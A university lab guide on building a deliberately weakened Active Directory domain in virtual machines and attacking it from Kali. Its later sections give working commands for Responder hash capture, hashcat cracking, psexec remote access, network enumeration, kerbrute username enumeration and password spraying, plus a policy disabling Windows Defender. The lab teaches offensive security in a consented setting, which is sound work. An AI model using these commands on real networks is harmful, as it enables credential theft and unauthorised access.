# Lab 5: Active Directory

{% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
{% endhint %}

In this lab, we will build an Active Directory environment in a virtualized lab and see how features can be exploited to hack Windows users. Active Directory (AD) is Microsoft’s service to manage Windows domain networks. 95% of Fortune 100 companies implement AD into their networks. The way you can use the same set of credentials, to log into any Windows machine within your given institution, is done through Active Directory. AD can easily span whole corporations and campuses, acting as a “phone book” for Windows desktops, printers, and other computers that need authentication services. For our purposes, our AD will span one server and one workstation, but the number of workstations can easily be increased following the guide below.

## 5.1. VM setup

{% hint style="danger" %}
This lab requires running 3 VMs (Windows server (1vCPU, 1GB Ram, 32GB Storage), Windows workstation (1vCPU, 1GB Ram, 20GB Storage), and Kali (1vCPU, 1GB Ram). If you have 4 cores, it leaves 1 core for your host computer, which usually isn't sufficient (likely to crash your computer). So if your computational power is lacking (less than 4 cores), you can do the lab with others in the lab (groups of 2 or 3 people). An offline router will be provided in the F2F lab for you to connect and do the lab (run through all the lab content and preinstall anything you would need from the internet before connecting), then connect to the router as a bridged mode and do the lab.

If you are an online student without sufficient computing power, you can read through the lab and ask our lab facilitators if you have any questions.
{% endhint %}

{% hint style="warning" %}
If using VirtualBox is giving you errors during the setup steps, you are recommended to try [VMware Workstation](https://www.vmware.com/au/products/workstation-player.html) instead. Most of the setup issues were resolved using the VMWare workstation based on the experience.&#x20;
{% endhint %}

You will need to use 3 VMs for this lab, one for each of the following:

* [Windows Server 2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019)
* [Windows 10 Enterprise](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise) / Windows 7 (see lab 2 instructions)
* [Kali Linux](https://www.kali.org/get-kali/)

You will already have Kali, so you can set up the Windows Server 2019. If you also need Windows 10 Enterprise, download the ISO from the link provided. You can type in junks in the required fields, it will still take you to the ISO downloads page.

{% hint style="info" %}
M1/M2 users:&#x20;

Because the time to set up the Windows Server 2019 is very long due to emulation, I have provided the pre-configured image that can be loaded directly onto UTM (do note thiat this is 10GB large!).

[Download Link](https://uniwa-my.sharepoint.com/:f:/g/personal/00098638\_uwa\_edu\_au/EjGITY9wMORGrSk8R\_ccm3YBI41RDK7St5FR98j\_8-vz6Q?e=BzzVrn)

You simply save it where you want, and double-click it, which should load onto the UTM. The credentials and accounts are listed in the notes. However, you are highly recommended to try setting up the DC yourself for learning purposes.
{% endhint %}

{% hint style="info" %}
M1/M2 users:&#x20;

you can follow these steps:

1. Add a new VM in UTM and select Emulate
2. Select Windows and insert ISO, also uncheck UEFI Boot
3. set CPU to 2, then continue to finish.
4. set CPU type to QEMU64, and force multicore.
5. Start the VM.
6. Press any key to boot from CD/DVD (remove CD once the installation finishes)

Please note, that this VM is very slow since it is emulated!



For the workstation (WS) VM, it is much easier to use Windows 7 from the previous labs (you can just clone it and use it) as you can disable the firewall much easier than on Windows 10.&#x20;
{% endhint %}

### 5.1.1 Setting Up Windows Server 2019 VM

{% hint style="info" %}
M1/M2 users, skip this part and scroll down.
{% endhint %}

Start the installation. Click "Next", leaving all options as default. Continue clicking "Next" until you reach the "Easy Install Information" window. Give whatever "Full Name" you'd like. Select "Windows Server Standard Core". Leave the product key blank.

![](../.gitbook/assets/lab-5-assets/1.png)

Keep clicking "Next" until the "Finish" button becomes available, again leaving all options as default. If any, before you click "Finish", uncheck the "Power on this virtual machine after creation" option, as there are a few more settings that we need to edit before we run the VM.

Click “Edit virtual machine settings” and:

* Remove the floppy disk
* Click on the "Options" tab → "Advanced" → under "Firmware Type", select "BIOS".
* You can also allocate additional resources if necessary

{% hint style="info" %}
M1/M2 users, start from here.
{% endhint %}

Follow the one-screen instructions and boot the VM. Click “Next”, then “Install Now”, then make sure to pick the “Windows Server 2019 Standard Evaluation (Desktop Experience)” option.

![](../.gitbook/assets/lab-5-assets/2.png)

Accept the license, click “Custom: Install Windows only (advanced)”, then click “Next”. This should commence the OS installation, which may take an extended period of time.

![](../.gitbook/assets/lab-5-assets/3.png)

The VM should then reboot on its own. Afterwhich, you should see the following "Customize Settings" screen. Use any password you'd like.

You should then see a login screen. In the VMware client, click the following button to send the `ctrl+alt+del` command to the PC and log in with the password you created earlier. The Server Manager should automatically start.

{% hint style="info" %}
M1/M2 users: you will set the password once the installation completes. When rebooted, you can press control + option + delete (fn + delete on laptops).
{% endhint %}

![](../.gitbook/assets/lab-5-assets/12.png)

Now rename your computer to make it easier to use by searching for "View your PC name" in the Windows search bar. We've chosen "DC-01" for this demonstration.

![](../.gitbook/assets/lab-5-assets/6.png)

At this point, you can "Power Off" this VM and move on to setting up the Windows 10 VM.

### 5.1.2 Using an existing Windows VM for a workstation

{% hint style="info" %}
M1/M2 users: recommended to use Windows 7.
{% endhint %}

You can use your existing Windows VM. Do this by making a duplicate of your existing one (ensure you randomize the MAC address to get a new IP address). You can skip the next section 5.1.3 and move on to section [5.1.4](lab-5-active-directory.md#5.1.4-preparing-the-network-discovery).

### 5.1.3 Setting Up a new Windows 10 Enterprise VM as a workstation

"Create a New Virtual Machine” and after clicking the “Use ISO image:” button, browse for the Windows 10 Enterprise ISO file. Click "Next" then select the “Windows 10 Enterprise” edition. This machine will act as a user on the network.

Similar to in [5.1.1](lab-5-active-directory.md#5.1.1-setting-up-windows-server-2019-vm) keep clicking "Next" until the "Finish" button becomes available, leaving all options as default, including leaving the product key blank. Before you click "Finish", uncheck the "Power on this virtual machine after creation" option. Once the VM is set up, edit the following settings, similar to before:

* Remove the floppy disk
* Click on the "Options" tab → "Advanced" → under "Firmware Type", select "BIOS".
* You can also allocate additional resources if necessary

Start up the VM and follow the installation instructions.&#x20;

Once you reach the "Sign in with Microsoft" screen, select “Domain join instead”.

Name your user account anything you'd like. Same with the password. You can set up any security questions you'd like; these aren't too important since the VM will be used just for the purposes of this lab. You can decline all the tracking, digital assistance, and privacy settings for the same reason.

### 5.1.4 Preparing the network discovery

Once the Windows VM is booted up, click on the `files` icon, click on “Network”, then right-click the yellow bar on top, and “Turn on network discovery and file sharing”, then click “Yes, turn on network discovery and file sharing for all public networks”.

![](../.gitbook/assets/lab-5-assets/14.png)

Rename your computer, similar to in [5.1.1](lab-5-active-directory.md#5.1.1-setting-up-windows-server-2019-vm). We've chosen "WS-01" for this demonstration.

![](../.gitbook/assets/lab-5-assets/13.png)

Restart your machine. Your user workstation is now set up. You can repeat this process to create as many workstations as you wish.

## 5.2 Setting up the Domain Controller

Open up your domain controller - Windows Server 2019 VM. The Server Manager will auto-launch at the start-up.

{% hint style="warning" %}
M1/M2 users: the VM runs extremely slow, you just have to be a bit more patient.
{% endhint %}

We are now going to install Domain Services. In the Server Manager, click on “Manage”, then “Add Roles and Features”.

![](../.gitbook/assets/lab-5-assets/9.png)

Keep clicking "Next" until you reach "Server Roles". Check the box next to "Active Directory Domain Services”, add services, click "Next" until the Results section then click “Install”.

Next, click the flag icon, then "Promote this server to a domain controller". Click “Add a new forest” then name your domain whatever you'd like. We've chosen "dc.local" as the root domain name for this demonstration.

![](../.gitbook/assets/lab-5-assets/10.png)

Set a domain controller password, then keep clicking "Next", then click "Install". The machine should reboot on its own after that.

![](../.gitbook/assets/lab-5-assets/11.png)

## 5.3 Configuring the Domain Controller

In the Server Manager dashboard, click “Tools” then “Active Directory Users and Computers”:

![](../.gitbook/assets/lab-5-assets/15.png)

Let's create a basic user. Click the arrow next to dc.local”, click on “Users”, then right click in the white space in the Users menu, hover over “New”, then select “User”.

![](../.gitbook/assets/lab-5-assets/16.png)

Give your new user a name. Here we're going with "test user1"

![](../.gitbook/assets/lab-5-assets/17.png)

Then enter in a password. For simplicity, I used `StrongPassword1`. Uncheck “User must change password at next logon” and check “Password never expires”. This is very bad policy if you were setting up a real Active Directory, however this makes things simpler for our testing purposes. Then click “Next” and “Finish”.

![](../.gitbook/assets/lab-5-assets/18.png)

Now let's create a domain admin to help us out on our network. Right-click the “Administrator” user then click “Copy”. Repeat the above steps for name/password. Here we're going with "testadmin". The password we'll use here is `password1!`.

![](../.gitbook/assets/lab-5-assets/19.png)

![](../.gitbook/assets/lab-5-assets/20.png)

Let's create a few more users. Copy our "test user1" user and repeat the previous steps for test users 2 and 3.

Many Active Directory’s utilize file shares. Let's set up a file share to see how that common feature can be a vulnerability. Close out of the “Users and Computers” window, then click on “File and Storage Services”.

![](../.gitbook/assets/lab-5-assets/24.png)

Then click “Shares”, “Tasks”, then “New Share…”.

![](../.gitbook/assets/lab-5-assets/25.png)

Click "Next" until you reach "Share Name", leaving the defaults. Give a name (we'll go with "testshare" here), and click "Next" until you can click "Create".

![](../.gitbook/assets/lab-5-assets/26.png)

Next let's disable Windows Defender so we can focus on the learning basics of attacking Active Directory, not Anti-virus evasion. Close out of command prompt and search for “Group Policy Management” in the task bar and open that up. Expand the "Domains" submenu, then right-click your root domain name, click “Create a GPO in this Domain, and Link it here…”.

![](../.gitbook/assets/lab-5-assets/28.png)

Enter something like "Disable Windows Defender" as your policy name. Find the policy you just made within your domain controller, right-click the policy and click "Edit". Expand the following arrows (Computer Configuration -> Policies -> Administrative Templates -> Windows Components) , and under "Windows Components" scroll down until you find "Windows Defender Antivirus".

![](../.gitbook/assets/lab-5-assets/29.png)

Double click “Turn off Windows Defender Antivirus".

![](../.gitbook/assets/lab-5-assets/30.png)

Click “Enabled”, “Apply”, “OK”. We are done configuring our (vulnerable) AD DC!

![](../.gitbook/assets/lab-5-assets/31.png)

## 5.4 Connecting Users to the Domain

### 5.4.1 On Windows 10 WS

{% hint style="info" %}
How to do this for Windows 7 WS is shown in section [5.4.2](lab-5-active-directory.md#5.4.2-windows-7-ws) below.
{% endhint %}

We will start with the Windows 10 workstation we created in [5.1.2](lab-5-active-directory.md#5.1.2-setting-up-windows-10-enterprise-wm). Open up this VM and log in. Go to the C Drive and create a new folder (we'll call it "Shares" here). This folder will be acting as our share drive in our AD system, perform the following actions to set it up:

* Right click → "Properties" → "Sharing" → "Share"
* Select your user and click "Share"
* Under "Password Protection", click on "Network and Sharing Center" and make sure "Turn on network discovery" is checked.

Now we need the IP Address of your domain controller to join this workstation to the domain. Go back to your Windows Server 2019 - domain controller machine and open up the command prompt again. Type in `ipconfig` and record the IPv4 Address. In the screenshot below, the address of the domain controller is at `192.168.86.131`.

![](../.gitbook/assets/lab-5-assets/32.png)

Back on the Windows 10 WS, right click on the networking icon in the lower right of the taskbar and click “Open Network & Internet Settings”.

![](../.gitbook/assets/lab-5-assets/33.png)

Click “Change adapter options”. Right-click on “Ethernet” and select “Properties”. Double click “Internet Protocol Version 4 (TCP/IPv4).

![](../.gitbook/assets/lab-5-assets/34.png)

Then set your “Preferred DNS server:” as the IP of the domain controller, then check off “Validate settings upon exit” so we know it works, then click “OK” on the last 2 windows.

![](../.gitbook/assets/lab-5-assets/35.png)

A window for "Windows Network Diagnostics" will open and try to detect any problems. If none are found, then we're good to go.

{% hint style="info" %}
M1/M2 users: seems the network diagnostics isn't working if your host is the preview version. You can instead try to ping your DC and see if you get replies.
{% endhint %}

In the taskbar search for “Access work or school”. Click "Connect", then click “Join this device to local Active Directory domain”.

![](../.gitbook/assets/lab-5-assets/36.png)

Type in your Root domain name `dc.local` and click “Next”. Type in your Administrator credentials, then click “OK”.

![](../.gitbook/assets/lab-5-assets/37.png)

Skip the "Add an account" step, then restart the machine.

Now we'll try to log into one of the users we configured on our domain controller, like "testuser1" for example. Instead of your normal user account, select "Other". It will say below the text entry forms "Sign in to: DC". If you see this, then we know our setup is working as we expected. Otherwise, type in the domain in front of the username `dc.local\testuser1` and it will detect the domain you are trying to join.

![](../.gitbook/assets/lab-5-assets/38.png)

Repeat these steps in [Connecting Users to Domain](lab-5-active-directory.md#5.4-connecting-users-to-the-domain) with any other Windows 10 workstations you want to hook up to your Active Directory.

### 5.4.2 Windows 7 WS

This is recommended for M1/M2 users since Windows Defender used on ARM64 are preview versions so you cannot disable Windows Defender so easily.&#x20;

Once logged in using a local account, open System by clicking the Start button, right-click “Computer”, and then click “Properties”.

![](<../.gitbook/assets/image (3).png>)

Select "Change settings" under "Computer name, domain, and workgroup settings" section.

![](../.gitbook/assets/image.png)

You can now select "Change" to change its domain. Here, you can rename the computer as well (this can be WS-01 as above, or if you have both then something like WS-02 - something easy to remember).

![](<../.gitbook/assets/image (10).png>)

Change the membership (domain), and press "OK" once complete. You will be prompted to enter the administrator details. You will then be asked to reboot. Now you are done!

## 5.5 Attacking the AD via Kali Linux

{% hint style="info" %}
If you have setup your AD using VMWare, you must also setup Kali on VMWare to configure the networking.
{% endhint %}

### 5.5.1 Exploiting a Windows Machine with Responder

We’re going to exploit our Active Directory by capturing NTLMv2 Hashes with Responder from `Impacket`. NTLMv2 hashes are basically the scrambled version of Windows passwords. We’ll get to unscrambling them soon enough.

`responder`, a tool from `Impacket`, should be intalled, but if not, you can use pip to install the network exploitation toolkit `Impacket`. Download it to your Kali system and install as follows:

```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket/
sudo pip install . --no-cache-dir
sudo python setup.py install
sudo pip install .
```

#### 5.5.1.1 Gather credentials using Responder

Begin running responder on your Kali machine with the following command:

```bash
sudo responder -I eth0 -dwv
```

`-I` to listen on your eth0 network interface, `-d` to enable answers for NetBIOS domain, `-w` to start WPAD rouge proxy server, `-v` for verbose output. These are the most common settings.

![](<../.gitbook/assets/image (17).png>)

Now Responder is listening on the network, it will be poisoning services like LLMNR and NBT-NS as you can see in the output. Listen long enough and `testadmin` will innocuously try to access one of the shared files on the network (maybe a typo or by accident). We can emulate this by logging into "testadmin" account and trying to access the undiscovered shared folder by typing "\\\sharedfolder" in the address bar of File Explorer.

![](<../.gitbook/assets/image (26).png>)

The responder is acting as an authenticator, so the request to access this new shared folder is captured (poisoned) by the responder and requests for authentication by the user (i.e., testadmin). This triggers the user to send its credentials, which will be captured as shown below.

![](<../.gitbook/assets/image (15).png>)

#### 5.5.1.2 Cracking the Hash

To turn this hash into a password, we can attempt hash cracking. The most popular tool to crack hashes of any kind is `hashcat`. You’ll find this preinstalled on your Kali machine. First, save the hash output to a text file.

Then, to crack this hash, we’re going to use a word list to compare the hashes too. If we get a match then we’ve found the password. A popular word list `rockyou.txt` is already pre-installed on every Kali machine located at `/usr/share/wordlist`. If it is still zipped, unzip it with the command:

```bash
sudo gunzip /usr/share/wordlist/rock.txt.gz
```

Then run `hashcat` with both your saved hash and the wordlist.

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

`-m 5600` is the number that designates NTMLv2 hashes and `--force` ignores any errors we get from running `hashcat` in a VM. Since we chose a very weak password for this user (testadmin:password1!), password cracking should take a very short time (under a minute).

![](<../.gitbook/assets/image (4).png>)

#### 5.5.1.3 `psexec` for remote access

`psexec` is a Microsoft-developed lightweight remote access program. Every Kali Linux is preinstalled with it. We can use it to remotely access testadmin’s computer with our newly found credentials. You need to enter the Root domain name (dc.local), the username (testadmin), the password (password1!), then the IP address of testadmin machine (192.168.86.132). The password needs to be in quotes otherwise the exclamation marks will be interpreted by Bash as regular expressions.

```bash
psexec.py dc.local/testadmin:'password1!'@192.168.86.132
```

{% hint style="info" %}
if you get an error:

`... Script 'scripts/psexec.py' not found in metadata ...`

it means impacket isn't installed correctly. This is a good time to work in the Python's virtual environment so let's do that:

<pre class="language-shell"><code class="lang-shell"><strong>git clone https://github.com/SecureAuthCorp/impacket.git
</strong><strong>virtualenv impacket-venv
</strong><strong>source impacket-venv/bin/activate
</strong><strong>cd ~/impacket
</strong><strong>pip3 install .
</strong><strong>psexec.py</strong></code></pre>

At this point, you should not see an error but if you do, ask for help.
{% endhint %}

![](<../.gitbook/assets/image (5).png>)

{% hint style="info" %}
If the `psexec` returns an error, make sure the Windows Defender Antivirus and/or Windows Firewall are disabled on the target machine.
{% endhint %}

This is how we could gain access to the user's account. However, in practice, you will unlikely know whether there is an AD DC on the network, etc. So you should really start by scanning the network to discover those step by step, which we will do next.

### 5.5.2 Target enumeration with Nmap, Nbtscan, CME

Obviously, the previous attack is one specific instance of exploiting the user on the AD domain. In practice, we need to do recon first, so in this section, we will look at a few AD-specific recon approaches. First enumerate what hosts are on the network, their IP addresses, how many are there, and what services they are running.

#### **5.5.2.1 Nmap**

The subnet of this network in this example is 192.168.86.0/24 (replace the address for your own subnet).

You would do host discovery first (as done in lab 1, so we will skip).

Once hosts are discovered (i.e., you found their IP addresses), we can scan for open ports. Previously, we just scanned all ports that are open, but we are only interested in AD-related services in this lab, so we will scope the port scanning down to ports 22, 53, 80, 88, 445 and 5985.

* 22: an obvious port you should know.
* 53: DNS
* 80: HTTP
* 88: Kerberos - is an authentication service.
* 445: SMB - The Server Message Block Protocol, which is a client-server communication protocol used for sharing access to files, printers, serial ports, and data on a network.
* 5985: Windows Remote Management

All these ports are utilised by the AD in some ways.

Now, enumerate common AD and Windows ports:

```bash
sudo nmap -T4 -n -Pn -sV -p22,53,80,88,445,5985 192.168.86.0/24
```

![](../.gitbook/assets/lab-5-assets/47.png)

Filtered ports we can assume are closed.&#x20;

Hosts with port 88 running Kerberos and port 53 running DNS open, we can strongly assume is the Domain Controller (DC) or a Windows Server. Now we know the Domain Controller is on 192.168.86.134. For the Domain name of the machine, enumerate the DC using LDAP and we’ll find the root domain name is dc.local, via:

```bash
sudo nmap -T4 -Pn -p 389 --script ldap* 192.168.86.134
```

![](<../.gitbook/assets/image (12).png>)

#### **5.5.2.2 nbtscan**

Another approach is to enumerate NetBIOS names of hosts using `nbtscan`:

```bash
nbtscan 192.168.86.0/24
```

![](<../.gitbook/assets/image (28).png>)

#### **5.5.2.3 CrackMapExec**

`CrackMapExec` more neatly finds host IP’s, NetBIOS names, domain names, Windows versions, SMB Signing all in one small command (also, prebuilt into Kali):

```bash
crackmapexec smb 192.168.86.0/24
```

![](<../.gitbook/assets/image (19).png>)

But as you can see, those tools provide different types of information about the target systems (e.g., IP, MAC, services, domain name etc.), but you will find that the speed of those scans differs. So you should use whichever is necessary for the job required at the time.

### 5.5.3 Kerbrute

In the previous section, we enumerated the network to find what computers are online. Now we need to find out what user accounts can authenticate to them. Once we have usernames, we can find passwords, then get our precious foothold into the system.

Kerberos makes it easy to enumerate valid usernames for the domain. We can send Kerberos requests to the DC checking different usernames, which we will do by using a tool named `kerbrute`. For the username list, you can use one from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) or craft one based on [naming conventions and what you know about the target](https://activedirectorypro.com/active-directory-user-naming-convention/).

#### **5.5.3.1 Kerbrute username enumeration**

We first need to set up Kerbrute, which requires GO to install. Then, download Kerbrute from the Git repository. Download the [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) usernames list using `wget` command below. You can combine this with other lists to build a larger store of usernames.

```bash
sudo apt-get install golang-go
```

```bash
git clone https://github.com/ropnop/kerbrute
make linux
```

{% hint style="info" %}
M1/M2 users: before you do `make`, you have to edit the Makefile:

change `ARCHS=amd64` to `ARCHS=arm64`
{% endhint %}

```bash
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/users.txt
```

Once installed, the binary will be available in the `dist` folder. Then, we can how run kerbrute as follows:

{% tabs %}
{% tab title="AMD64" %}
```bash
dist/kerbrute_linux_386 userenum users.txt -d dc.local --dc 192.168.86.134
```
{% endtab %}

{% tab title="ARM64" %}
```bash
dist/kerbrute_linux_arm64 userenum users.txt -d dc.local --dc 192.168.86.134
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
You may not find a matching username if they aren't in the username list. You can manually add your missing usernames to the username list and run `kerbrute` again and see whether they are matched or not.
{% endhint %}

![Running on AMD64](../.gitbook/assets/lab-5-assets/51.png)

![Running on ARM64](<../.gitbook/assets/image (27).png>)

So you can see that this script is nothing but a pattern matching username from the list and querying whether such a user exists or not. I hope that I don't have to go into detail about how this is done, given the basic mechanism is the same as what has been covered in previous labs.

#### 5.5.3.2 Kerbrute password spraying

Now that we have discovered users on the domain `dc.local`, it's time to try and find passwords. Of course, we can use attacks such as discussed in section [5.5.1](lab-5-active-directory.md#5.5.1-exploiting-a-windows-machine-with-responder), but there are many ways to do so, and so we shall do that.&#x20;

The Kerbrute tool has a password spraying function, which we will use here.

```bash
./kerbrute_linux_386 passwordspray -d dc.local --dc 192.168.86.134 users.txt password1!
```

{% hint style="info" %}
This also may fail, if the username you created doesn't exist in the username list, or the password you used is not in the password list. You can simply add the password you set for your user into the password list and rerun.
{% endhint %}

![](<../.gitbook/assets/image (24).png>)

Obviously, trying password manually isn't ideal so we want to automate this, which can be done using `crackmapexec`. Obviously, in modern authentication, you will be locked out of your account after a certain number of failed attempts, and will also be flagged for the administrators to have a. look.

![](<../.gitbook/assets/image (25).png>)

There are tools available to control the password spraying frequency, such as  this spraying script:

```bash
git clone https://github.com/Greenwolf/Spray
```

The usage is as follows:

{% code overflow="wrap" %}
```
Usage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
{% endcode %}

Even then, if there is a cap on the number of attempts allowed, then such an approach cannot be used.

### 5.6 Conclusion

This is just the beginning of exploiting AD, there are so many other ways to exploit AD and gain access to user accounts and sensitive data - exploiting misconfigurations, poisoning AD protocols, kerberoasting, pass the hash etc.

Due to its popularity, AD has gained much attention from adversaries, and also it has exposed many vulnerabilities in the past (and is still being discovered). This is both good and bad - the good is that the protection against attacks can be enhanced from previous lessons, and the bad is that due to its complexity, properly securing is a challenging task and this is what we observe in practice.



**Next up**: Web Security (SQLi, XSS kind of stuff)

**Preparation**: We will be using docker to host web services for testing. It should be already loaded on Kali, but if it isn't please have it ready.



Credit: some materials adopted from Robert Scocca
